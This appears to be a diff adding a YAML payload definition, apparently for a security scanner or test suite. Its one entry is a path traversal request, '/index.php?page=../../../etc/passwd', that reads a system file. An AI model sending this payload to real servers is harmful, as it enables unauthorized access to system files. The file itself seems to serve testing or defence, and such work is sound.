@@ -1,0 +1,7 @@
+name: "OTHER_APP_ATTACK"
+description: >
+  Accesses system files via traversal.
+payloads:
+  - id: other_app_attack
+    payload: "/index.php?page=../../../etc/passwd"
+    description: Accesses system files via traversal.
